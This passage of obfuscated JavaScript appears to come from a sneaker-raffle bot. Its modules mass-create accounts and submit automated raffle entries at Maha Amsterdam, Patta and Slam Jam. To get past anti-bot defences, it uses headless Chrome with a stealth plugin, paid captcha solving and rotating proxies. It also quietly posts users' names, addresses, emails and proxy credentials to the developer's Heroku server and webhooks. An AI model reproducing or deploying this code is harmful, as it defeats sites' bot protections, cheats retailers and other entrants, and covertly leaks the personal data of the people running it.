                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5ab073, _0x4b9d0b, _0x22117e) {
                    var _0x4b9d0b = [], _0x3b2ca8 = ![];
                    async function _0x16be8e() {
                        var _0x492f13 = new _0x3dffcd({
                            'user': _0x5450ed['masterMail'],
                            'password': _0x5450ed['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x19ea08(_0x37f4a6) {
                            _0x492f13['openBox']('INBOX', ![], _0x37f4a6);
                        }
                        _0x492f13['once']('ready', function () {
                            _0x19ea08(function (_0x1bd9b5, _0x5c54bd) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1bd9b5)
                                    throw _0x1bd9b5;
                                _0x492f13['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x1531ee, _0x9a989c) {
                                    if (!_0x9a989c || !_0x9a989c['length'])
                                        console['log'](_0x42a46a() + '\x20[' + _0x5ab073['name'] + ']\x20No\x20mails\x20found'), _0x492f13['end']();
                                    else {
                                        var _0x540c04 = _0x492f13['seq']['fetch'](_0x9a989c, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x540c04['on']('message', function (_0x40cc90, _0x126a37) {
                                            var _0x3e0467 = '(#' + _0x126a37 + ')\x20';
                                            _0x40cc90['on']('body', function (_0x59c955, _0x632864) {
                                                _0x255d24(_0x59c955, (_0xe9d7af, _0x1aaca0) => {
                                                    var _0x4ca07f = _0x1aaca0['text']['split']('(')[0x1], _0x4ee003 = _0x4ca07f['split'](')')[0x0];
                                                    _0x4b9d0b['push'](_0x4ee003);
                                                });
                                            }), _0x40cc90['once']('end', function () {
                                            });
                                        }), _0x540c04['once']('error', function (_0x2d261e) {
                                            console['log']('Fetch\x20error:\x20' + _0x2d261e), _0x3b2ca8 = !![];
                                        }), _0x540c04['once']('end', function () {
                                            _0x492f13['end'](), _0x3b2ca8 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x492f13['once']('error', function (_0x5806a8) {
                            console['log'](_0x5806a8), _0x3b2ca8 = !![];
                        }), _0x492f13['once']('end', async function () {
                            _0x3b2ca8 = !![];
                        }), _0x492f13['connect']();
                    }
                    async function _0x2e4451(_0x128f69, _0x5563a5, _0x2ca371) {
                        for (var _0x150e44 = 0x0; _0x150e44 < _0x5563a5['length']; _0x150e44++) {
                            async function _0x224ddb(_0x142037, _0x5c36f8, _0xba6a56, _0x512caa, _0x4c9d66) {
                                var _0x244e6c, _0x477562 = {}, _0x370852 = [], _0x5512f8 = {}, _0x299a3b = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x3d6b7a = Math['round'](Math['random']() * (_0x299a3b['length'] - 0x1));
                                _0x512caa[_0x142037]['Size'] == 'RANDOM' && (_0x512caa[_0x142037]['Size'] = _0x299a3b[_0x3d6b7a]);
                                !_0x512caa && (_0x512caa = {});
                                if (_0x5450ed['useRandomProxy'] = ![])
                                    var _0xd916f9 = _0x4c9d66[_0x142037]['split'](':');
                                else
                                    var _0x15a1b8 = Math['round'](Math['random']() * (_0x4c9d66['length'] - 0x1)), _0xd916f9 = _0x4c9d66[_0x15a1b8]['split'](':');
                                var _0x181dfc = {
                                    'jar': _0x23361c,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xba6a56['url'],
                                    'headers': _0xba6a56['headers'],
                                    'body': JSON['stringify'](_0x477562),
                                    'proxy': 'http://' + _0xd916f9[0x2] + ':' + _0xd916f9[0x3] + '@' + _0xd916f9[0x0] + ':' + _0xd916f9[0x1]
                                };
                                return _0x5c36f8 != 'ver' && (_0x181dfc['url'] = _0xba6a56['url'], _0x181dfc['headers'] = _0xba6a56['headers']), _0x5c36f8 == 'ver' && (_0x181dfc['method'] = 'GET', _0x181dfc['url'] = _0x512caa[_0x142037]), new Promise(function (_0x344c70, _0x41e620) {
                                    callback = async (_0x201552, _0x242d1e, _0x45cd83) => {
                                        if (!_0x201552 && _0x242d1e['statusCode'] == 0xca || !_0x201552 && _0x242d1e['statusCode'] == 0xc8) {
                                            if (_0x5c36f8 != 'ver') {
                                                var _0x129178 = await _0x5605d8(_0x512caa[_0x142037], _0xba6a56, 'dev', ![]), _0xcf401d = await _0x5605d8(_0x512caa[_0x142037], _0xba6a56, 'pub', ![]);
                                                const _0x25d17e = {
                                                    'succesDEVMSG': { 'embeds': [_0x129178] },
                                                    'succesPUBMSG': { 'embeds': [_0xcf401d] }
                                                };
                                                if (_0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '')
                                                    try {
                                                        await _0x49f827(_0x5450ed['webhook'], _0x25d17e['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x25d17e['succesDEVMSG']), await _0x488ffe(0xc8);
                                                try {
                                                    await _0x49f827(_0x1bf959, _0x25d17e['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xb5b21(_0x512caa[_0x142037], _0xba6a56);
                                            }
                                            _0x344c70(console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0xba6a56['name'] + ']\x20Task\x20' + (_0x142037 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x5c36f8 != 'ver') {
                                                var _0x22f39d = '' + _0x201552, _0x3e4446 = await _0x5605d8(_0x512caa[_0x142037], _0xba6a56, 'dev', !![], _0x22f39d), _0xbe8eba = {};
                                                _0xbe8eba['errorDEV'] = { 'embeds': [_0x3e4446] }, _0x2e6413(_0x512caa[_0x142037], _0xba6a56), _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0xbe8eba['errorDEV']), await _0x49f827(_0x47580b, _0xbe8eba['errorDEV']);
                                            }
                                            _0x41e620(console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0xba6a56['name'] + ']\x20Task\x20' + (_0x142037 + 0x1) + ':\x20' + _0x201552)));
                                        }
                                    };
                                    try {
                                        _0x5c36f8 != 'ver' ? console['log'](_0x42a46a() + '\x20[' + _0xba6a56['name'] + ']\x20Task\x20' + (_0x142037 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x477562['data']['attributes']['email']) : console['log'](_0x42a46a() + '\x20[' + _0xba6a56['name'] + ']\x20Task\x20' + (_0x142037 + 0x1) + ':\x20Fetching\x20Response'), _0x23fd33(_0x181dfc, callback);
                                    } catch (_0x34ef6f) {
                                        console['log'](_0x42a46a() + '\x20Task\x20' + (_0x142037 + 0x1) + ':\x20' + _0x34ef6f);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x224ddb(_0x150e44, 'ver', _0x128f69, _0x5563a5, _0x2ca371), console['log'](_0x42a46a() + '\x20[' + _0x128f69['name'] + ']\x20Sleeping\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                            } catch (_0x19cfc4) {
                            }
                        }
                    }
                    try {
                        _0x16be8e();
                        while (!_0x3b2ca8) {
                            await _0x488ffe(0xfa0);
                        }
                        console['log']('Found\x20' + _0x4b9d0b['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x2e4451(_0x5ab073, _0x4b9d0b, _0x22117e);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x2a20db, _0x24f193, _0x8049cb) {
                    _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5450ed['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x16a7d4 = 0x0; _0x16a7d4 < _0x24f193['length']; _0x16a7d4++) {
                        var _0x3fd219 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x15d59c
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5450ed['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x21b502
                                }
                            ]
                        }];
                        const _0x37125f = { 'embeds': _0x3fd219 };
                        _0x55ca22(_0x2a20db['name'] + '\x20Task\x20' + (_0x16a7d4 + 0x1) + '\x20/\x20' + _0x24f193['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                        try {
                            await _0x3215be(_0x24f193, _0x16a7d4);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x41c828 = await _0x5605d8(_0x24f193[_0x16a7d4], _0x2a20db, 'acc', ![]);
                        const _0x472b2d = { 'succesDEVMSG': { 'embeds': [_0x41c828] } };
                        if (_0x24f193[_0x16a7d4]['Email'] == '' || _0x24f193[_0x16a7d4]['FirstName'] == '' || _0x24f193[_0x16a7d4]['LastName'] == '') {
                            console['log'](_0x42a46a() + '\x20[' + _0x20cf41[taskModule]['name'] + ']\x20Task\x20' + (_0x16a7d4 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x488ffe(0x7d0);
                            continue;
                        }
                        (_0x24f193[_0x16a7d4]['Password'] == '' || _0x24f193[_0x16a7d4] == undefined) && _0x24f193[_0x16a7d4]['Password'] == 'JRaffles23!';
                        if (_0x5450ed['useRandomProxy'] = ![])
                            var _0x31aaf1 = _0x8049cb[_0x16a7d4]['split'](':');
                        else
                            var _0x581ade = Math['round'](Math['random']() * (_0x8049cb['length'] - 0x1)), _0x31aaf1 = _0x8049cb[_0x581ade]['split'](':');
                        var _0x3fc172;
                        try {
                            _0x3fc172 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x31aaf1[0x0] + ':' + _0x31aaf1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3fc172 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x31aaf1[0x0] + ':' + _0x31aaf1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x382be2 = await _0x3fc172['newPage']();
                            await _0x382be2['authenticate']({
                                'username': '' + _0x31aaf1[0x2],
                                'password': '' + _0x31aaf1[0x3]
                            }), console['log'](_0x42a46a() + '\x20[' + _0x2a20db['name'] + ']\x20Task\x20' + (_0x16a7d4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x382be2['setRequestInterception'](!![]), _0x382be2['on']('request', _0x16dba0 => {
                                _0x16dba0['resourceType']() === 'image' || _0x16dba0['resourceType']() === 'font' || _0x16dba0['resourceType']() === 'media' ? _0x16dba0['abort']() : _0x16dba0['continue']();
                            }), await _0x382be2['goto']('https://patta.nl/account/register'), await _0x488ffe(0xbb8), await _0x382be2['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x42a46a() + '\x20[' + _0x2a20db['name'] + ']\x20Task\x20' + (_0x16a7d4 + 0x1) + '\x20:\x20Filling\x20information'), await _0x382be2['type']('#RegisterForm-FirstName', '' + _0x24f193[_0x16a7d4]['FirstName']), await _0x488ffe(0x226), await _0x382be2['type']('#RegisterForm-LastName', '' + _0x24f193[_0x16a7d4]['LastName']), await _0x488ffe(0x226), await _0x382be2['type']('#RegisterForm-email', '' + _0x24f193[_0x16a7d4]['Email']), await _0x488ffe(0x226), await _0x382be2['type']('#RegisterForm-password', '' + _0x24f193[_0x16a7d4]['Password']), await _0x488ffe(0x226), console['log'](_0x42a46a() + '\x20[' + _0x2a20db['name'] + ']\x20Task\x20' + (_0x16a7d4 + 0x1) + '\x20:\x20Submitting..'), await _0x382be2['$eval']('#RegisterForm', _0x870848 => _0x870848['submit']()), await _0x488ffe(0x1f40);
                            try {
                                await _0x382be2['waitForSelector']('.home-page-grid__collection'), await _0x488ffe(0x1f4), console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x2a20db['name'] + ']\x20Task\x20' + (_0x16a7d4 + 0x1) + '\x20:\x20Account\x20' + _0x24f193[_0x16a7d4]['Email'] + '\x20Generated!')), _0x7d8dbf['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x24f193[_0x16a7d4]['Email'] + ',' + _0x24f193[_0x16a7d4]['Password']), console['log'](_0x387ef2['yellow'](_0x42a46a() + '\x20[' + _0x2a20db['name'] + ']\x20Task\x20' + (_0x16a7d4 + 0x1) + '\x20:\x20Account\x20' + _0x24f193[_0x16a7d4]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x472b2d['succesDEVMSG']);
                                } catch {
                                }
                                await _0x49f827(_0x2b5f53, _0x472b2d['succesDEVMSG']);
                            } catch (_0x371fc0) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x20cf41[taskModule]['name'] + ']\x20Task\x20' + (_0x16a7d4 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x371fc0));
                            }
                        } catch (_0xa13792) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x20cf41[taskModule]['name'] + ']\x20Task\x20' + (_0x16a7d4 + 0x1) + '\x20:\x20' + _0xa13792));
                        } finally {
                            _0x3fc172 && _0x3fc172['close'](), console['log']('Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x278b36, _0x5569c4, _0x312631) {
                    _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5450ed['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x52201c = 0x0; _0x52201c < _0x5569c4['length']; _0x52201c++) {
                        var _0x4bc025;
                        if (_0x1c0f09 != 'yes')
                            var _0x1c0f09 = '', _0x483068 = 0x0;
                        _0x55ca22(_0x278b36['name'] + '\x20Task\x20' + (_0x52201c + 0x1) + '\x20/\x20' + _0x5569c4['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                        try {
                            await _0x3215be(_0x5569c4, _0x52201c);
                        } catch {
                            _0x1c0f09 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x5569c4[_0x52201c]['Email'] == '' || _0x5569c4[_0x52201c]['Password'] == '' || _0x5569c4[_0x52201c]['FirstName'] == '' || _0x5569c4[_0x52201c]['LastName'] == '') {
                            console['log'](_0x42a46a() + '\x20[' + _0x20cf41[taskModule]['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5450ed['useRandomProxy'] = ![])
                            var _0x1cc93d = _0x312631[_0x52201c]['split'](':');
                        else
                            var _0x12d99f = Math['round'](Math['random']() * (_0x312631['length'] - 0x1)), _0x1cc93d = _0x312631[_0x12d99f]['split'](':');
                        var _0x468cca;
                        try {
                            _0x468cca = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1cc93d[0x0] + ':' + _0x1cc93d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x468cca = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1cc93d[0x0] + ':' + _0x1cc93d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xa935b5 = await _0x468cca['newPage']();
                            await _0xa935b5['authenticate']({
                                'username': '' + _0x1cc93d[0x2],
                                'password': '' + _0x1cc93d[0x3]
                            }), console['log'](_0x42a46a() + '\x20[' + _0x278b36['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20Getting\x20Session'), await _0xa935b5['setRequestInterception'](!![]), _0xa935b5['on']('request', _0x5cd4a7 => {
                                _0x5cd4a7['resourceType']() === 'image' || _0x5cd4a7['resourceType']() === 'font' || _0x5cd4a7['resourceType']() === 'media' ? _0x5cd4a7['abort']() : _0x5cd4a7['continue']();
                            }), await _0xa935b5['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xa935b5['waitForSelector']('#CustomerEmail'), console['log'](_0x42a46a() + '\x20[' + _0x278b36['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20Logging\x20in..'), await _0xa935b5['type']('#CustomerEmail', '' + _0x5569c4[_0x52201c]['Email']), await _0x488ffe(0x12c), await _0xa935b5['type']('#CustomerPassword', '' + _0x5569c4[_0x52201c]['Password']), await _0x488ffe(0x226), await _0xa935b5['$eval']('#customer_login', _0x1ec280 => _0x1ec280['submit']());
                            try {
                                await _0xa935b5['waitForSelector']('#orders'), await _0x488ffe(0x4b0);
                            } catch {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x278b36['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0xa935b5['goto']('' + _0x5569c4[_0x52201c]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x488ffe(0xbb8), console['log'](_0x42a46a() + '\x20[' + _0x278b36['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0xa935b5['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x278b36['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0xa935b5['type']('#email', '' + _0x5569c4[_0x52201c]['Email']), await _0x488ffe(0x384), await _0xa935b5['type']('#first_name', '' + _0x5569c4[_0x52201c]['FirstName']), await _0x488ffe(0x514), await _0xa935b5['type']('#last_name', '' + _0x5569c4[_0x52201c]['LastName']), await _0x488ffe(0x514), await _0xa935b5['type']('#street_address', _0x5569c4[_0x52201c]['Address1'] + '\x20' + _0x5569c4[_0x52201c]['HouseNumber'] + '\x20' + _0x5569c4[_0x52201c]['Address2']), await _0x488ffe(0x2bc);
                            _0x5569c4[_0x52201c]['Postcode'] == undefined && (_0x5569c4[_0x52201c]['Postcode'] = _0x5569c4[_0x52201c]['Zip']);
                            await _0xa935b5['type']('#zip_code', '' + _0x5569c4[_0x52201c]['Postcode']), await _0x488ffe(0x320), await _0xa935b5['type']('#city', '' + _0x5569c4[_0x52201c]['City']), await _0x488ffe(0x320), await _0xa935b5['type']('#bday', '01/01/1994'), await _0x488ffe(0x320), await _0xa935b5['type']('#instagram', '' + _0x5569c4[_0x52201c]['Follower']), await _0x488ffe(0x352);
                            if (_0x5569c4[_0x52201c]['Size'] == 'RANDOM') {
                                const _0x9187db = await _0xa935b5['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x3ff5fe => {
                                    return _0x3ff5fe['map'](_0x2e865a => _0x2e865a['textContent']);
                                });
                                var _0x5bb017 = Math['round'](Math['random']() * (_0x9187db['length'] - 0x1));
                                console['log'](_0x42a46a() + '\x20[' + _0x278b36['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x9187db[_0x5bb017]), await _0xa935b5['click']('label[data-eu-size=\x22' + _0x9187db[_0x5bb017] + '\x22]');
                            } else {
                                console['log'](_0x42a46a() + '\x20[' + _0x278b36['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x5569c4[_0x52201c]['Size']);
                                try {
                                    await _0xa935b5['click']('label[data-eu-size=\x22' + _0x5569c4[_0x52201c]['Size'] + '\x22]');
                                } catch {
                                    await _0xa935b5['click']('label[data-eu-size=\x22' + _0x5569c4[_0x52201c]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x488ffe(0xbb8), await _0xa935b5['$$eval']('.raffle__checkbox-label', _0x112cd1 => _0x112cd1['forEach'](_0xb568a => _0xb568a['click']())), await _0x488ffe(0x7d0), console['log'](_0x42a46a() + '\x20[' + _0x278b36['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0xa935b5['click']('#raffle__form-submit'), await _0x488ffe(0x1388);
                            try {
                                await _0xa935b5['waitForSelector']('#raffle__confirmation-message-container'), _0x1c0f09 = 'no', _0xb5b21(_0x5569c4[_0x52201c], _0x278b36), console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x278b36['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x551c11 = _0x5569c4[_0x52201c];
                                try {
                                    prxdata = {
                                        'username': _0x15d59c['replace']('#', ''),
                                        'module': _0x278b36['name'],
                                        'entrydata': JSON['stringify'](_0x551c11),
                                        'proxy': '' + _0x312631[_0x52201c]
                                    };
                                    var _0x1a599e = JSON['stringify'](prxdata);
                                    let _0x177757 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0x1a599e, _0x177757);
                                } catch (_0x4063c8) {
                                }
                            } catch (_0x2379d7) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x20cf41[taskModule]['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x2379d7));
                            }
                        } catch (_0x4ee6ee) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x20cf41[taskModule]['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20' + _0x4ee6ee)), _0x1c0f09 = 'yes';
                        } finally {
                            _0x468cca && _0x468cca['close']();
                            if (_0x1c0f09 == 'yes' && _0x483068 != 0x5 && _0x4bc025 != 'Size\x20Not\x20Found') {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x278b36['name'] + ']\x20Task\x20' + (_0x52201c + 0x1) + '\x20:\x20Retrying\x20(' + _0x483068 + '\x20/\x205)')), _0x52201c = _0x52201c - 0x1, _0x483068 = _0x483068 + 0x1;
                                continue;
                            }
                            _0x1c0f09 == 'yes' && _0x483068 >= 0x5 && (_0x2e6413(_0x5569c4[_0x52201c], _0x278b36), _0x1c0f09 = 'no', _0x483068 = 0x0), console['log']('Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x11c84c, _0x2baa01, _0x383059) {
                    _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5450ed['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x491849 = 0x0; _0x491849 < _0x2baa01['length']; _0x491849++) {
                        if (_0x584578 != 'yes')
                            var _0x584578 = '', _0x3f3f1a = 0x0;
                        var _0x49a7c3 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x15d59c
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5450ed['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x21b502
                                }
                            ]
                        }];
                        const _0x529461 = { 'embeds': _0x49a7c3 };
                        _0x55ca22(_0x11c84c['name'] + '\x20Task\x20' + (_0x491849 + 0x1) + '\x20/\x20' + _0x2baa01['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                        try {
                            await _0x3215be(_0x2baa01, _0x491849);
                        } catch {
                            _0x584578 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x35c6d0 = await _0x5605d8(_0x2baa01[_0x491849], _0x11c84c, 'acc', ![]);
                        const _0x484809 = { 'succesDEVMSG': { 'embeds': [_0x35c6d0] } };
                        if (_0x2baa01[_0x491849]['Email'] == '' || _0x2baa01[_0x491849]['FirstName'] == '' || _0x2baa01[_0x491849]['LastName'] == '') {
                            console['log'](_0x42a46a() + '\x20[' + _0x20cf41[taskModule]['name'] + ']\x20Task\x20' + (_0x491849 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x488ffe(0x7d0);
                            continue;
                        }
                        (_0x2baa01[_0x491849]['Password'] == '' || _0x2baa01[_0x491849] == undefined) && _0x2baa01[_0x491849]['Password'] == 'JRaffles23!';
                        if (_0x5450ed['useRandomProxy'] = ![])
                            var _0x149c8b = _0x383059[_0x491849]['split'](':');
                        else
                            var _0x500cc1 = Math['round'](Math['random']() * (_0x383059['length'] - 0x1)), _0x149c8b = _0x383059[_0x500cc1]['split'](':');
                        var _0x16a892;
                        try {
                            _0x16a892 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x149c8b[0x0] + ':' + _0x149c8b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x16a892 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x149c8b[0x0] + ':' + _0x149c8b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3c3403 = await _0x16a892['newPage']();
                            await _0x3c3403['authenticate']({
                                'username': '' + _0x149c8b[0x2],
                                'password': '' + _0x149c8b[0x3]
                            }), console['log'](_0x42a46a() + '\x20[' + _0x11c84c['name'] + ']\x20Task\x20' + (_0x491849 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3c3403['setRequestInterception'](!![]), _0x3c3403['on']('request', _0x1d6a4e => {
                                _0x1d6a4e['resourceType']() === 'image' || _0x1d6a4e['resourceType']() === 'font' || _0x1d6a4e['resourceType']() === 'media' ? _0x1d6a4e['abort']() : _0x1d6a4e['continue']();
